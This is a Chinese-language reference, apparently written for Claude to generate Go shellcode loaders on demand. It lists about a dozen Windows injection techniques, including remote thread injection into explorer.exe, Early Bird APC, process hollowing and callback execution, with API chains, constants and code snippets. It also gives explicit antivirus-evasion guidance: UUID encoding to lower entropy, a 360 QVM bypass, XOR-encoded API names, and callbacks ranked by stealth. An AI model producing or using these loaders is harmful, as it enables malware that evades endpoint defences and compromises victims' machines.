# Shellcode 注入技术参考（知识驱动动态生成）

共 13 类技术，每类描述 API 调用链、关键常量和 **SyscallN 参数数量**。Claude 根据这些知识**现场生成**代码，而非使用固定模板。

**重要：所有技术统一使用 `syscall.LoadLibrary` + `syscall.GetProcAddress` + `syscall.SyscallN` 调用 API，禁止使用 `golang.org/x/sys/windows`。**

---

## API 参数数量速查表（SyscallN 必须精确匹配）

| API | 所属 DLL | 参数数量 | SyscallN 示例 |
|-----|----------|----------|---------------|
| VirtualAlloc | kernel32 | 4 | `SyscallN(pVA, 0, size, 0x3000, 0x40)` |
| VirtualAllocEx | kernel32 | 5 | `SyscallN(pVAEx, hProc, 0, size, 0x3000, 0x40)` |
| VirtualProtect | kernel32 | 4 | `SyscallN(pVP, addr, size, 0x20, &old)` |
| CreateThread | kernel32 | 6 | `SyscallN(pCT, 0, 0, addr, 0, 0, &tid)` |
| CreateRemoteThread | kernel32 | 7 | `SyscallN(pCRT, hProc, 0, 0, addr, 0, 0, &tid)` |
| WaitForSingleObject | kernel32 | 2 | `SyscallN(pWSO, handle, 0xFFFFFFFF)` |
| RtlMoveMemory | ntdll | 3 | `SyscallN(pRMM, dst, src, size)` |
| RtlCopyMemory | ntdll | 3 | `SyscallN(pRCM, dst, src, size)` |
| WriteProcessMemory | kernel32 | 5 | `SyscallN(pWPM, hProc, addr, src, size, 0)` |
| OpenProcess | kernel32 | 3 | `SyscallN(pOP, 0x1F0FFF, 0, pid)` |
| CreateFiber | kernel32 | 3 | `SyscallN(pCF, 0, addr, 0)` |
| ConvertThreadToFiber | kernel32 | 1 | `SyscallN(pCTTF, 0)` |
| SwitchToFiber | kernel32 | 1 | `SyscallN(pSTF, fiber)` |
| QueueUserAPC | kernel32 | 3 | `SyscallN(pQUA, addr, hThread, 0)` |
| SleepEx | kernel32 | 2 | `SyscallN(pSE, 0, 1)` |
| GetCurrentThread | kernel32 | 0 | `SyscallN(pGCT)` |
| CreateFileMappingW | kernel32 | 6 | `SyscallN(pCFM, ^uintptr(0), 0, 0x40, 0, size, 0)` |
| MapViewOfFile | kernel32 | 5 | `SyscallN(pMVF, hMap, 0x2, 0, 0, size)` |
| ResumeThread | kernel32 | 1 | `SyscallN(pRT, hThread)` |
| CreateProcessW | kernel32 | 10 | 见下方详细说明 |

---

## 1. VirtualAlloc + CreateThread（本地线程执行）

**API 调用链：**
- kernel32.VirtualAlloc(0, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) → addr [4参数]
- ntdll.RtlMoveMemory(addr, &shellcode[0], size) [3参数]
- kernel32.CreateThread(0, 0, addr, 0, 0, &tid) [6参数]
- kernel32.WaitForSingleObject(thread, INFINITE) [2参数]

**Go SyscallN 示例：**
```go
k32, _ := syscall.LoadLibrary(dx(k32Enc, KEY))
ntd, _ := syscall.LoadLibrary(dx(ntdEnc, KEY))
pVA, _ := syscall.GetProcAddress(k32, dx(vaEnc, KEY))
pRMM, _ := syscall.GetProcAddress(ntd, dx(rmmEnc, KEY))
pCT, _ := syscall.GetProcAddress(k32, dx(ctEnc, KEY))
pWSO, _ := syscall.GetProcAddress(k32, dx(wsoEnc, KEY))

addr, _, _ := syscall.SyscallN(pVA, 0, uintptr(len(sc)), 0x3000, 0x40)
syscall.SyscallN(pRMM, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
var tid uint32
hThread, _, _ := syscall.SyscallN(pCT, 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&tid)))
syscall.SyscallN(pWSO, hThread, 0xFFFFFFFF)
```

**变体：**
- `createthread` — 标准版，直接 RWX 分配
- `createthread_vp` — 先 RW 分配，复制后 VirtualProtect 改 RX（更隐蔽但不兼容 SGN）

**常量：** MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40, PAGE_EXECUTE_READ=0x20, INFINITE=0xFFFFFFFF

---

## 2. Fiber 执行

**API 调用链：**
- kernel32.ConvertThreadToFiber(0) → 转换当前线程 [1参数]
- kernel32.VirtualAlloc(0, size, 0x3000, 0x40) → addr [4参数]
- ntdll.RtlMoveMemory(addr, &sc[0], size) [3参数]
- kernel32.CreateFiber(0, addr, 0) → fiber [3参数]
- kernel32.SwitchToFiber(fiber) → 触发执行 [1参数]

**特点：** 不走 CreateThread，规避线程创建监控

---

## 3. 远程线程注入

**API 调用链：**
- kernel32.OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) [3参数]
- kernel32.VirtualAllocEx(hProcess, 0, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) [5参数]
- kernel32.WriteProcessMemory(hProcess, addr, &shellcode[0], size, 0) [5参数]
- kernel32.CreateRemoteThread(hProcess, 0, 0, addr, 0, 0, &tid) [7参数]

**目标进程获取：** 通过 CreateToolhelp32Snapshot + Process32First/Next 枚举，找 explorer.exe 的 PID
- CreateToolhelp32Snapshot(0x2, 0) [2参数] — TH32CS_SNAPPROCESS=0x2
- Process32FirstW(hSnap, &entry) [2参数]
- Process32NextW(hSnap, &entry) [2参数]

**常量：** PROCESS_ALL_ACCESS=0x1F0FFF

---

## 4. Early Bird APC 注入

**API 调用链：**
- kernel32.CreateProcessW(..., CREATE_SUSPENDED, ..., &si, &pi) → 创建挂起进程 [10参数]
- kernel32.VirtualAllocEx(pi.Process, 0, size, 0x3000, 0x40) [5参数]
- kernel32.WriteProcessMemory(pi.Process, addr, &shellcode[0], size, 0) [5参数]
- kernel32.QueueUserAPC(addr, pi.Thread, 0) → 插入 APC [3参数]
- kernel32.ResumeThread(pi.Thread) → 恢复执行 [1参数]

**常量：** CREATE_SUSPENDED=0x00000004

---

## 5. 进程镂空（Process Hollowing）

**API 调用链：**
- kernel32.CreateProcessW(svchost.exe, ..., CREATE_SUSPENDED, ..., &si, &pi)
- kernel32.GetThreadContext(pi.Thread, &ctx) → 获取 CONTEXT
- kernel32.ReadProcessMemory(pi.Process, ctx.Rdx+0x10, &imageBase, 8, &read)
- ntdll.NtUnmapViewOfSection(pi.Process, imageBase) → 卸载原镜像
- kernel32.VirtualAllocEx(pi.Process, 0, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
- kernel32.WriteProcessMemory(pi.Process, newBase, &shellcode[0], size, 0)
- ctx.Rcx = newBase（x64 入口点）
- kernel32.SetThreadContext(pi.Thread, &ctx)
- kernel32.ResumeThread(pi.Thread)

**CONTEXT 结构（x64）：** 需要完整定义，ContextFlags=0x10001F，入口点在 Rcx 偏移

---

## 6. 映射注入（Mapping Injection）

**本地执行版 API 调用链：**
- kernel32.CreateFileMappingW(INVALID_HANDLE_VALUE, 0, PAGE_EXECUTE_READWRITE, 0, size, 0) [6参数]
- kernel32.MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, size) → addr [5参数]
- ntdll.RtlMoveMemory(addr, &shellcode[0], size) [3参数]
- kernel32.CreateThread(0, 0, addr, 0, 0, &tid) → 执行 [6参数]
- kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF) [2参数]

**特点：** 不走 VirtualAlloc/WriteProcessMemory，使用 Section 对象分配内存

**常量：** INVALID_HANDLE_VALUE=^uintptr(0) (Go中), FILE_MAP_WRITE=0x0002, PAGE_EXECUTE_READWRITE=0x40

---

## 7. 堆执行（Heap Execution）

**API 调用链：**
- ntdll.RtlCreateHeap(HEAP_CREATE_ENABLE_EXECUTE, 0, 0, 0, 0, 0) → hHeap [6参数]
- ntdll.RtlAllocateHeap(hHeap, 0, size) → addr [3参数]
- ntdll.RtlMoveMemory(addr, &shellcode[0], size) [3参数]
- kernel32.CreateThread(0, 0, addr, 0, 0, &tid) [6参数]
- kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF) [2参数]

**特点：** 完全不使用 VirtualAlloc，内存来自自定义堆。**不兼容 SGN**（堆内存可能没有 WRITE 权限）

**常量：** HEAP_CREATE_ENABLE_EXECUTE=0x00040000

---

## 8. UUID 编码 / 混淆

**原理：** shellcode 每 16 字节一块 → UUID 字符串（`XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX`）。全部 hex + 短横线格式，熵值极低，AV/AI 引擎将其分类为"正常配置数据"而非加密载荷。

**两种执行路径：**

### 8A. 回调执行（Go 侧编码）

shellcode 加密后嵌入 Go 源码，运行时 Go 侧 `bytesToUUID` 转 UUID → HeapCreate + UuidFromStringA 解码 → EnumSystemLocalesA 回调触发。

**API 调用链：**
- kernel32.HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0) → hHeap [3参数]
- kernel32.HeapAlloc(hHeap, 0, 0x00100000) → addr [3参数]
- Rpcrt4.UuidFromStringA(&uuidStr, addrPtr) → 循环写入每个 UUID [2参数]
- kernel32.EnumSystemLocalesA(addr, 0) → 回调执行 [2参数]

**UUID 大小端处理（Go 侧，纯标准库实现）：**
```go
// 每 16 字节转 UUID 字符串，无需外部依赖
func bytesToUUID(b []byte) string {
    return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
        binary.LittleEndian.Uint32(b[0:4]),
        binary.LittleEndian.Uint16(b[4:6]),
        binary.LittleEndian.Uint16(b[6:8]),
        binary.BigEndian.Uint16(b[8:10]),
        b[10:16])
}
```

**常量：** HEAP_CREATE_ENABLE_EXECUTE=0x00040000

### 8B. Fiber 执行（Python 预编码）— 360 QVM F2 专项

shellcode 在 Python 侧预编码为 UUID 字符串数组 → 嵌入 Go 源码 → VirtualAlloc + UuidFromStringA 解码 → Fiber 执行。无需 HeapCreate，直接 RWX 内存。

**API 调用链：**
- kernel32.VirtualAlloc(0, UUID_COUNT*16, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) [4参数]
- Rpcrt4.UuidFromStringA(u8, ptr) → 循环逐个解码 [2参数]
- kernel32.ConvertThreadToFiber(0) [1参数]
- kernel32.CreateFiber(0, base, 0) [3参数]
- kernel32.SwitchToFiber(fiber) [1参数]

**必须导入：** `Rpcrt4.dll`，通过 XOR 编码后 `syscall.LoadLibrary` 加载。

**⚠️ 端序陷阱（关键！）：**

Windows `UuidFromStringA` 写入内存时对 Data1(4B)/Data2(2B)/Data3(2B) 做 little-endian 转换。**Python 编码时必须预翻转：**

```python
chunk[0], chunk[3] = chunk[3], chunk[0]  # Data1 预翻转
chunk[1], chunk[2] = chunk[2], chunk[1]  # Data2 预翻转
chunk[4], chunk[5] = chunk[5], chunk[4]  # Data3 预翻转
chunk[6], chunk[7] = chunk[7], chunk[6]
```

**Go 运行时必须使用 ANSI 版本 API：**
```go
// 正确：UuidFromStringA 是 ANSI 版本
u8, _ := syscall.BytePtrFromString(uuid)
syscall.SyscallN(pUuidFromStringA, uintptr(unsafe.Pointer(u8)), ptr)

// 错误：UTF16PtrFromString 会让每个字符间插入 \0
// u16, _ := syscall.UTF16PtrFromString(uuid)  ← WRONG!
```

**与 AES+XOR 加密对比：**
- AES+XOR 加密后熵值 7.5-7.9（落入 QVM 高危 bin）
- UUID 编码后熵值极低（hex 字符 + 短横线），被分类为配置数据

**完整 QVM 流程：** 使用 `scripts/build_qvm.py <shellcode.bin>` 一键构建。详见 `references/qvm-bypass.md`。

---

## 9. 回调执行（Callback Execution）— 46 种 API

**核心模式：** VirtualAlloc(RWX) → RtlMoveMemory(shellcode) → 将 shellcode 地址作为回调传入系统枚举 API，由系统内部回调触发执行。不走 CreateThread，规避线程创建监控。

**通用 Go 代码模板：**
```go
addr, _, _ := syscall.SyscallN(pVA, 0, uintptr(len(sc)), 0x3000, 0x40)
syscall.SyscallN(pRMM, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
// 可选：VirtualProtect 改 RX (0x20) 提高隐蔽度
syscall.SyscallN(callbackFuncPtr, addr, <extraArgs...>)
```

### 9.1 kernel32.dll 回调（17 种）

| API | 参数数 | 隐蔽度 | 备注 |
|-----|--------|--------|------|
| `CopyFile2` | 4 | ★★★★ | 文件复制进度回调，需构造 `Copyfile2ExtendedParameters` 结构体 |
| `CopyFileEx` | 4 | ★★★★ | 同上，进度回调模式 |
| `CreateThreadPoolWait` | 4 | ★★★★ | 线程池等待回调，不同于 CreateTimerQueueTimer |
| `CreateTimerQueueTimer` | 7 | ★★★ | 定时器队列回调，延迟触发 |
| `EnumCalendarInfoW` | 4 | ★★★★★ | 日历信息枚举（如 CAL_SMONTHNAME1），极其冷门 |
| `EnumCalendarInfoExW` | 4 | ★★★★★ | 扩展日历枚举 |
| `EnumDateFormatsW` | 4 | ★★★★★ | 日期格式枚举 |
| `EnumDateFormatsExW` | 4 | ★★★★★ | 扩展日期格式枚举 |
| `EnumLanguageGroupLocalesW` | 4 | ★★★★★ | 语言组区域枚举 |
| `EnumResourceTypesW` | 4 | ★★★★★ | 资源类型枚举 |
| `EnumResourceTypesExW` | 5 | ★★★★★ | 扩展资源类型枚举 |
| `EnumSystemLocalesW` | 2 | ★★★ | 系统区域枚举（UUID 技术的执行端） |
| `EnumTimeFormatsW` | 3 | ★★★★★ | 时间格式枚举 |
| `EnumTimeFormatsEx` | 4 | ★★★★★ | 扩展时间格式枚举 |
| `EnumUILanguagesW` | 4 | ★★★★★ | UI 语言枚举 |
| `FlsAlloc` / `FlsFree` | 1 | ★★★★ | Fiber Local Storage 回调 |
| `InitOnceExecuteOnce` | 4 | ★★★★★ | 一次性初始化回调，极不寻常的执行路径 |
| `SetTimer` | 4 | ★★★ | 经典定时器回调 |

### 9.2 user32.dll 回调（12 种）

| API | 参数数 | 隐蔽度 | 备注 |
|-----|--------|--------|------|
| `EnumChildWindows` | 3 | ★★★ | 子窗口枚举 |
| `EnumDesktopW` | 2 | ★★★★ | 桌面枚举 |
| `EnumDesktopWindows` | 3 | ★★★ | 桌面窗口枚举 |
| `EnumDisplayMonitors` | 4 | ★★★★ | 显示器枚举 |
| `EnumFontFamiliesW` | 4 | ★★★★ | 字体族枚举 |
| `EnumFontFamiliesExW` | 4 | ★★★★ | 扩展字体族枚举 |
| `EnumFontsW` | 4 | ★★★★ | 字体枚举 |
| `EnumPropsW` / `EnumPropsEx` | 3 | ★★★★★ | 窗口属性枚举 |
| `EnumThreadWindows` | 3 | ★★★★ | 线程窗口枚举 |
| `EnumWindows` | 2 | ★★☆ | 顶层窗口枚举（最常用，监控较多） |
| `EnumWindowStationsW` | 2 | ★★★★★ | 窗口站枚举 |

### 9.3 ntdll.dll 回调（2 种）

| API | 参数数 | 隐蔽度 | 备注 |
|-----|--------|--------|------|
| `LdrEnumerateLoadedModules` | 3 | ★★★★★ | LDR 模块枚举，需通过 `GetProcAddress` 动态获取 |
| `LdrpCallInitRoutine` | 4 | ★★★★★ | LDR 初始化例程调用，内部 API |

### 9.4 dbghelp.dll 回调（6 种）— 极冷门 DLL

| API | 参数数 | 隐蔽度 | 备注 |
|-----|--------|--------|------|
| `EnumerateLoadedModules` | 3 | ★★★★★ | 已加载模块枚举，需先 SymInitialize |
| `EnumDirTreeW` | 4 | ★★★★★ | 目录树枚举 |
| `ImageGetDigestStream` | 3 | ★★★★★ | 镜像摘要流回调 |
| `SymEnumProcesses` | 2 | ★★★★★ | 符号进程枚举，需先 SymInitialize |
| `SymFindFileInPath` | 5 | ★★★★★ | 符号文件路径搜索 |
| `SysEnumSourceFiles` | 4 | ★★★★★ | 源文件枚举 |

**DLL 加载：** `syscall.LoadLibrary(dx(dbghelpEnc, KEY))`

### 9.5 其他冷门 DLL 回调（9 种）

| API | DLL | 参数数 | 隐蔽度 | 备注 |
|-----|-----|--------|--------|------|
| `CertEnumSystemStore` | crypt32 | 4 | ★★★★ | 证书存储枚举 |
| `CryptEnumOIDInfo` | crypt32 | 4 | ★★★★ | OID 信息枚举 |
| `EnumICMProfiles` | gdi32 | 4 | ★★★★★ | ICM 颜色配置文件枚举 |
| `EnumObjects` | gdi32 | 3 | ★★★★★ | GDI 对象枚举 |
| `EnumPageFilesW` | psapi | 2 | ★★★★★ | 页面文件枚举 |
| `EnumPwrSchemes` | powrprof | 2 | ★★★★ | 电源方案枚举 |
| `ImmEnumInputContext` | imm32 | 3 | ★★★★★ | IME 输入上下文枚举 |
| `SetupCommitFileQueueW` | setupapi | 3 | ★★★★★ | 安装文件队列提交回调 |

### 回调技术选择建议

| 场景 | 推荐 |
|------|------|
| 默认回调（平衡） | `EnumDisplayMonitors` / `EnumFontFamiliesW` |
| 高隐蔽 | `EnumCalendarInfoW` / `EnumTimeFormatsW` / `EnumUILanguagesW`（kernel32 冷门枚举） |
| 极隐蔽 | `SymEnumProcesses` / `EnumDirTreeW`（dbghelp.dll，几乎不被监控） |
| 最冷门 | `ImmEnumInputContext`（imm32.dll）/ `EnumICMProfiles`（gdi32.dll）/ `SetupCommitFileQueueW`（setupapi.dll） |

**注意：** dbghelp / setupapi / imm32 / gdi32 / psapi 等非标准 DLL 需要通过 `LoadLibrary` 动态加载，API 名使用 XOR 编码。

---

## 10. APC 自注入

**API 调用链：**
- kernel32.VirtualAlloc(0, size, 0x3000, 0x04) → 分配 RW 内存 [4参数]
- ntdll.RtlMoveMemory(addr, &sc[0], size) → 复制 shellcode [3参数]
- kernel32.VirtualProtect(addr, size, 0x20, &old) → 改为 RX [4参数]
- kernel32.GetCurrentThread() → hThread [0参数]
- kernel32.QueueUserAPC(addr, hThread, 0) [3参数]
- kernel32.SleepEx(0, 1) → Alertable wait 触发 APC [2参数]

**特点：** 不创建新线程，APC 在当前线程 Alertable 状态执行

**常量：** PAGE_READWRITE=0x04, PAGE_EXECUTE_READ=0x20

